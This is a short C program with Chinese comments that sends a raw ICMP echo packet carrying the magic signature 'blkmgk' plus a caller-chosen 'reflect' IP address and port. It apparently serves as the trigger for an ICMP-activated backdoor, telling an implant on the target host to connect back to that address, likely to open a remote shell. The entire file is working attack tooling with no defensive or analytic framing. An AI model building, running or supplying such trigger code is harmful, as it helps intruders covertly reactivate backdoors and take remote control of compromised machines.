#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <unistd.h>

#define PACKET_SIZE 64

struct icmp_packet {
    struct icmphdr icmp_header;
    char signature[16];
};

struct payload_t {
    uint32_t saddr;
    uint32_t port;
};

unsigned short calculate_checksum(unsigned short *paddress, int size) {
    unsigned int checksum = 0;
    while (size > 1) {
        checksum += *paddress++;
        size -= sizeof(unsigned short);
    }
    if (size)
        checksum += *(unsigned char *)paddress;
    checksum = (checksum >> 16) + (checksum & 0xffff);
    checksum += (checksum >> 16);
    return (unsigned short)(~checksum);
}


int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in dest_addr;
    struct icmp_packet packet;
    struct in_addr reflect_addr;
    struct payload_t payload;
    int packet_size = sizeof(struct icmp_packet);
    unsigned short dport = 0;
    char *dest_ip = NULL;
    char *reflect_ip = NULL;
    char *port = NULL;

    if (argc != 4) {
        printf("Usage: %s <dest_ip> <reflect_ip> <port>\n", argv[0]);
        exit(1);
    }
    dest_ip = argv[1];
    reflect_ip = argv[2];

    // 创建原始套接字
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    // 转reflect_ip为二进制
    if (inet_pton(AF_INET, reflect_ip, &reflect_addr) != 1) {
        perror("inet_pton");
        exit(1);
    }
    payload.saddr = reflect_addr.s_addr;

    // 转字符串port为unsigned short
    port = argv[3];
    payload.port = (unsigned int)atoi(port);

    // 设置目标地址结构
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, dest_ip, &(dest_addr.sin_addr));

    // 设置 ICMP 报文
    memset(&packet, 0, packet_size);
    packet.icmp_header.type = ICMP_ECHO;
    packet.icmp_header.code = 0;
    packet.icmp_header.checksum = 0;
    packet.icmp_header.un.echo.id = getpid();
    packet.icmp_header.un.echo.sequence = 1;

    strncpy(packet.signature, "blkmgk", sizeof(packet.signature) - 1);
    memcpy(packet.signature + 6, &payload, sizeof(payload));

    packet.icmp_header.checksum = calculate_checksum((unsigned short *)&packet, packet_size);

    // 发送 ICMP 报文
    int bytes_sent = sendto(sockfd, &packet, packet_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (bytes_sent < 0) {
        perror("sendto");
        exit(1);
    }

    printf("Black Magic!\n");

    close(sockfd);

    return 0;
}
